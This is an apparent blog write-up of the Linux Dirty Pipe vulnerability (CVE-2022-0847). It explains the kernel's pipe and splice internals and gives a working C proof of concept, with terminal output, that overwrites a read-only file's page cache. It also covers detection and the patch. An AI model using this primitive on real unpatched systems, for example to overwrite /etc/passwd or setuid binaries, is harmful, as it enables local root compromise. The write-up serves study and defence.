---
title: Dirty Pipe (CVE-2022-0847)
date: 2025-08-05 22:00:00 + 0530
image: /assets/img/59dd9cc4ba6eaf3c5cf29b0e819adb183c5c0af0fa5c4e990bc545704a1951bb.png
categories: [Vulnerability Research, CVE]
tags: [pwn, kernel]     # TAG names should always be lowercase
---

- **Impact**: Local privilege escalation
- **Type**: Arbitrary File Write
- **Why**: Similar to Dirty COW, but newer and easier to exploit
- v5.8 <= **affected kernels** < 5.10.102, 5.15.25, 5.16.11
- **Fix**: [Kernel patch](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=9d2231c5d74e13b2a0546fee6737ee4446017903)

## Setting up vulnerable environment

- Download Linux v5.8
- Build with `CONFIG_DEBUG_INFO=y` enabled
- Fix compiler errors:
  - [bool is already a symbol](https://lkml.org/lkml/2025/1/20/511)
  - [missing symbol table](https://github.com/torvalds/linux/commit/1d489151e9f9d1647110277ff77282fe4d96d09b.patch)
  - [`ptr` may be used after `realloc`](https://unix.stackexchange.com/a/767697)
- Start playing

## TODO

- [ ] Why is `echo 3 > /proc/sys/vm/drop_caches` not restoring original state of file

---

## 1. Files

### 1.1 Background

["Everything is a file"](https://en.wikipedia.org/wiki/Everything_is_a_file), is a core concept in Unix and Unix-like operating systems (including Linux). It is a fundamental design principle treating various system resources as if they were ordinary files for interaction and management. This includes:

1. Regular files
2. Directories
3. Hardware devices
4. Named pipes
5. Sockets
6. so on

### 1.2 Privileged files

Certain files like `/proc/kallsyms`, `/dev/mem` or `/etc/shadow` are considered privileged files, because they are only accessible by the root user, or processes with elevated privileges. These files control critical aspects of the system like kernel symbols, memory contents and user credentials respectively.

### 1.3 Dirty pipe

One of such privileged files is `/etc/passwd`. This file is typically readable by non root users to determine existing users on the system and some basic information regarding them. However, as a legacy feature this file can also be used to store user credentials. Hence, for obvious reasons, it is not writable by any non root user.

This is where dirty pipe comes into play. Dirty pipe is a Linux kernel bug that undermines the assumption that read-only files are safe from modifications. It allows an unprivileged user to inject arbitrary data into a read-only file.

With this arbitrary file write primitive, an attacker can:

1. Change the password for the root user to something arbitrary by overwriting `/etc/passwd` and get privileged access.
2. Overwrite a setuid binary with something like `/bin/sh` and spawn a root shell directly.

And achieve the same in possibly many other ways as well.

### 1.4 Copy-On-Write (CoW)

Understanding Copy-On-Write (CoW) is crucial to exploiting the dirty pipe vulnerability. To understand CoW, let's take a look at how a naive file copy program would work:
1. Read file from disk into buffer:
    This would involve a system call like `sys_read` which will grab the file from the disk and load it into an in-kernel memory region known as the page cache. Holding the data in this cache allows for faster access to the filesystem without trying to touch the disk every time. The contents of the page cache are then copied to userspace memory.
2. Write buffer into another file on disk:
    Once the buffer is filled in userspace with the file data, we can make another system call like `sys_write`, which will copy the buffer contents from userspace to the page cache again, and then eventually go on to save the page cache in the disk (flush operation).

A simplified diagrammatic view would look something like this:

![naive copy](/assets/img/6b13c61c3e577ad780591606fec1d06dfe09ba4b02a38eaf7d1e6a0dc09768d4.png){: .light}
![naive copy](/assets/img/202ddb219b70ca6022b98c1e44e20634cb6bb5f60fbc51b3c11c2ef6b64c2ad9.png){: .dark}

However, there is a major drawback associated with this method. This naive method introduces redundancies and inefficiencies. Since this is a "copy" program, hence, there is no modification of data. This is why it is unnecessary to copy all those bytes from kernel space to userspace and vice versa, wasting memory and useful clock cycles. Along with that, there is practically no need to switch to userspace, only to enter the kernel mode again for the write operation, wasting even more precious CPU time. This is usually solved by using zero-copy system calls like `sendfile` or `splice`, which avoids the context-switch to userspace altogether by transferring all bytes within the kernel context. But there is one more bit of redundancy. Since after copying, both, the original and the new files are identical, there is practically no need to copy all bytes again. Instead, only the file's associated page cache can be changed and a "reference" to the original file's page cache can be set. This is in fact, a true zero-copy mechanism. Whenever a process needs to "write" to either file, at that time the page cache is lazily "copied" and modifications are made to the new one, hence the name, "Copy-On-Write".

![zero copy transfer](/assets/img/1db3b348a99f349a71c52f6d4fc11ce8f073cd95dd9241710d386f6401df1193.png){: .light}
![zero copy transfer](/assets/img/44ccc1a6a66beeddcb3f7e425664af2363fef097f191afe0d2c4a7eae5c78e8d.png){: .dark}

> While this CoW principle is typically only implemented at the memory level, some filesystems like BTRFS and ZFS do implement it for actual disk data as well, making them more space efficient at certain times.
{: .prompt-info }

## 2. Pipes

### 2.1 Background

Pipes in Linux, are a form of Inter-Process Communication (IPC) that allow the data to flow from one process to another in a unidirectional stream. Most commonly they are used to connect the output of one command to the input of another in the shell, like this:

```shell
ls -l | grep ".txt" # List .txt files
cat myfile | wc -l  # How many lines in myfile
```

Pipes are of 2 types:
1. Anonymous pipes - Temporary. Used between processes having common ancestors
2. Named pipes (FIFO) - Persistent. Used between unrelated processes

In low level languages like C, you would use system calls to initialize a pipe like this

```c
#include <unistd.h>
int pipefd[2];
pipe(pipefd);
// pipefd[0] -> Read end of the pipe
// pipefd[1] -> Write end of the pipe
```

### 2.2 How is it implemented in the kernel

> From this section onward we will start delving into the kernel source code.
{: .prompt-warning }

The pipe, in kernel is represented as a `struct pipe_inode_info` with the [following definition](https://elixir.bootlin.com/linux/v5.8/source/include/linux/pipe_fs_i.h#L34):

```c
struct pipe_inode_info {
    struct mutex mutex;
    wait_queue_head_t rd_wait, wr_wait;
    unsigned int head;
    unsigned int tail;
    unsigned int max_usage;
    unsigned int ring_size;
#ifdef CONFIG_WATCH_QUEUE
    bool note_loss;
#endif
    unsigned int nr_accounted;
    unsigned int readers;
    unsigned int writers;
    unsigned int files;
    unsigned int r_counter;
    unsigned int w_counter;
    struct page *tmp_page;
    struct fasync_struct *fasync_readers;
    struct fasync_struct *fasync_writers;
    struct pipe_buffer *bufs;
    struct user_struct *user;
#ifdef CONFIG_WATCH_QUEUE
    struct watch_queue *watch_queue;
#endif
};
```

- Most importantly for us, the actual data gets stored in a FIFO ring buffer array `bufs`.
- Each buffer in the ring is worth a page of memory.
- By default, the kernel initializes space for [up-to 16 pages](https://elixir.bootlin.com/linux/v5.8/source/include/linux/pipe_fs_i.h#L5), so 64 KiB of memory at a time in the pipe.
- `bufs` is a ring buffer (a FIFO circular queue), each element of which is of type `struct pipe_buffer` with the [following definition](https://elixir.bootlin.com/linux/v5.8/source/include/linux/pipe_fs_i.h#L17)

```c
struct pipe_buffer {
    struct page *page;
    unsigned int offset, len;
    const struct pipe_buf_operations *ops;
    unsigned int flags;
    unsigned long private;
};
```

- Whenever we read or write into a pipe, the data is sourced into its corresponding `page`.
- Both of these structs are allocated and initialized in the [`alloc_pipe_info`](https://elixir.bootlin.com/linux/v5.8/source/fs/pipe.c#L785) function with the following call tree:

```
pipe(int pipefd[2]) called
    (context-switch to kernel)
        -> sys_pipe2 
            -> do_pipe2
                -> __do_pipe_flags
                    -> create_pipe_files
                        -> get_pipe_inode
                            -> alloc_pipe_info
```

### 2.3 But what about CoW?

As discussed in the previous sections, following the CoW principle, when a file is written into a pipe, the actual bytes are NOT copied, instead only the page cache which is backing the file, gets copied into the pipe buffer's `page` field.

Normally, data written from userspace into a pipe ends up in a newly allocated page, referenced by the pipe buffer's `->page` field. But what's to stop us from tricking the kernel into loading a read-only file's page cache into that same `->page` field and then overwriting it in memory?

This evades all permission checks since we aren't writing to a file, instead the kernel is writing directly to the page cache in memory.

However, it is not so simple. Since this is an obvious issue, the kernel has a check (`pipe_buf_can_merge`) before writing the data into the page. If the check fails, the kernel, instead makes a copy of page and writes data there.

Previous versions of the kernel handled this via the `ops` field of `struct pipe_buffer`, ensuring it is equal to `anon_pipe_buf_ops`, [see](https://elixir.bootlin.com/linux/v5.7.19/source/fs/pipe.c#L481).

However, [starting with version 5.8](https://github.com/torvalds/linux/commit/f6dd975583bd8ce088400648fd9819e4691c8958), this functionality is handled by the `flags` field of the `struct pipe_buffer`. In particular this version introduced a new flag bit `PIPE_BUF_FLAG_CAN_MERGE`, [see](https://elixir.bootlin.com/linux/v5.8/source/fs/pipe.c#L469). If this flag is set, our data can be directly written into the pipe buffer's page. If it is not set ( which should be the case when file's page cache reference is saved in `->page` ), then the kernel will make a copy of the page and write the contents there, leaving the original page cache untouched.

## 3. Splice

### 3.1 Background

The `splice` system call is yet another performance optimization related to file I/O. It allows data to be transferred between two file descriptors (either should be a pipe) directly in kernel space without needing to go through userspace at all. This makes it a true zero-copy mechanism.

Typically, you would use it like this:

```c
splice(file, NULL, pipefd[1], NULL, 4096, 0); // file -> pipe
splice(pipefd[0], NULL, sock, NULL, 4096, 0); // pipe -> socket
// Optimized for : cat example.txt | nc 127.0.0.1 12345
```

### 3.2 The real vulnerability

You might wonder why did we suddenly bring splice into the picture, the answer is that, not all implementation of pipes are correctly setup.

Specifically, if you use splice to write some data to a pipe buffer, the kernel will copy the page cache reference of the "file to write" into pipe buffer's `->page`, and also setup other fields like `->offset` and `->len` which is expected typical behavior, however, it fails to initialize the `->flags` field.

You can use the following call tree to reach [`copy_page_to_iter_pipe`](https://elixir.bootlin.com/linux/v5.8/source/lib/iov_iter.c#L368):

```
splice() called
    (context-switch to kernel mode)
        -> sys_splice
            -> do_splice
                -> do_splice_to
                    -> splice_read <=> generic_file_splice_read
                        -> call_read_iter
                            -> read_iter <=> shmem_file_read_iter
                                -> copy_page_to_iter
                                    -> copy_page_to_iter_pipe <==   buf->flags NOT CLEARED 
                                                                    This only adds the page cache to buf->page and sets the ->offset & ->len fields.
```

where it clearly does not set the flags to 0:

```c
    buf = &pipe->bufs[i_head & p_mask];
    ...
    buf->ops = &page_cache_pipe_buf_ops;
    get_page(page);
    buf->page = page;
    buf->offset = offset;
    buf->len = bytes;
```

What this means is that, calling splice makes the pipe buffer use the previous state of flags. And we can easily make the previous state of flags contains the `PIPE_BUF_FLAG_CAN_MERGE` bit set by using a normal anonymous pipe like we do for IPC.

## 4. Dirty pipe

### 4.1 Strategy

As discussed previously, the exploitation path is simple:

- We allocate an anonymous pipe and initialize the ring buffer
- Fill all buffers in the ring completely (`write`)
- This sets the `PIPE_BUF_FLAG_CAN_MERGE` in all pipe buffers
- Then we drain the pipe completely (`read`)
- This still retains the flags
- Use splice to write at least one byte from target file into the pipe
- This sets up the `->page`, `->offset` and `->len` fields for the pipe buffer
- But does not initialize the `->flags`, which means it still contains the `PIPE_BUF_FLAG_CAN_MERGE` flag
- Now we use a normal `write` to write to the file, if the data can fit into the page, it does overwrite the page cache in memory
- Hence this way the page cache gets corrupted while the kernel thinks otherwise
- This means all further access to the file, will be directly from the page cache and not the disk ( for performance reasons as discussed previously )
- Basically, for the current boot, the file is as good as overwritten

> This only affects the page cache in kernel memory, not the real file on the disk. On next boot, the file should be restored to original state, unless some other process flushes this page cache to the disk saving it manually.
{: .prompt-tip }

### 4.2 Conditions

You might have already noticed that there are a few conditions that need to be met for this attack to succeed:

1. The kernel should obviously be vulnerable.
2. Since we are writing to the page cache, we cannot write data across a page boundary. That is, it has to be bounded inside the page.
3. We need to `splice` at least 1 byte, to load the page cache into pipe buffer. This means, we will always have to write at some offset ( >= 1 ) in the file.
4. The file should be readable by us, in order to `splice`.
5. We can only overwrite existing bytes of the file, that is, we cannot enlarge the file.

### 4.3 Proof-Of-Concept (PoC)

```c
#define _GNU_SOURCE
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

void set_flag_on_pipe_buffers(int pipefd[2]) {
  // Initialise pipe
  if (pipe(pipefd)) {
    abort();
  }

  int pipe_size = fcntl(pipefd[1], F_GETPIPE_SZ);
  char *large_data = malloc(pipe_size);

  // Fill all pipe buffers
  write(pipefd[1], large_data, pipe_size);
  // Drain them
  read(pipefd[0], large_data, pipe_size);
}

int main() {
  int pipefd[2];
  off_t offset = 10;

  puts("[*] Preparing pipe...");
  set_flag_on_pipe_buffers(pipefd);
  puts("[+] Done");

  puts("[*] Opening file...");
  int fd = open("file.txt", O_RDONLY);
  printf("[+] Got fd = %d\n", fd);

  puts("[*] Splicing...");
  offset -= 1;
  splice(fd, &offset, pipefd[1], NULL, 1, 0); // VULN
  puts("[+] Done");

  // The `->flags` still contain `PIPE_BUF_FLAG_CAN_MERGE`

  puts("[*] Overwriting...");
  const char *overwrite_data = "\n[[[ HACKED ]]]\n";
  write(pipefd[1], overwrite_data, strlen(overwrite_data)); // should be written to page cache
  puts("[+] Done");

  close(pipefd[0]);
  close(pipefd[1]);
  close(fd);
  return 0;
}
```

```sh
/tests $ ls -l
total 772
-rw-r--r--    1 0        0              101 Aug  5 04:01 file.txt
-rwxr-xr-x    1 1000     1000        782936 Aug  5 04:01 test
/tests $ id
uid=1000 gid=1000 groups=1000
/tests $ echo XXXXYYYY > file.txt
/bin/sh: can't create file.txt: Permission denied
/tests $ cat file.txt
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
/tests $ ./test
[*] Preparing pipe...
[+] Done
[*] Opening file...
[+] Got fd = 5
[*] Splicing...
[+] Done
[*] Overwriting...
[+] Done
/tests $ ls -l
total 772
-rw-r--r--    1 0        0              101 Aug  5 04:01 file.txt
-rwxr-xr-x    1 1000     1000        782936 Aug  5 04:01 test
/tests $ cat file.txt
aaaabaaaca
[[[ HACKED ]]]
aahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
/tests $
```

## 5. Detection and Mitigation

Since the overwrite happens in the kernel space, it is not possible for a userspace process to detect this behavior directly. This leaves only eBPF based approaches to detect in-memory corruption of page cache. Or periodic hash based integrity checks against sensitive files.

As far as mitigation is concerned, probably the only way is to update the kernel which patches the `copy_page_to_iter_pipe` function by initializing the `->flags` in the pipe buffer.

```patch
diff --git a/lib/iov_iter.c b/lib/iov_iter.c
index b0e0acdf96c15e..6dd5330f7a9957 100644
--- a/lib/iov_iter.c
+++ b/lib/iov_iter.c
@@ -414,6 +414,7 @@ static size_t copy_page_to_iter_pipe(struct page *page, size_t offset, size_t by
        return 0;
 
    buf->ops = &page_cache_pipe_buf_ops;
+   buf->flags = 0;
    get_page(page);
    buf->page = page;
    buf->offset = offset;
@@ -577,6 +578,7 @@ static size_t push_pipe(struct iov_iter *i, size_t size,
            break;
 
        buf->ops = &default_pipe_buf_ops;
+       buf->flags = 0;
        buf->page = page;
        buf->offset = 0;
        buf->len = min_t(ssize_t, left, PAGE_SIZE);
```

## References
- [https://dirtypipe.cm4all.com/](https://dirtypipe.cm4all.com/)
- [https://www.aquasec.com/blog/deep-analysis-of-the-dirty-pipe-vulnerability/](https://www.aquasec.com/blog/deep-analysis-of-the-dirty-pipe-vulnerability/)
- [https://knqyf263.hatenablog.com/entry/2022/03/11/105130](https://knqyf263.hatenablog.com/entry/2022/03/11/105130)
- [https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits](https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits)
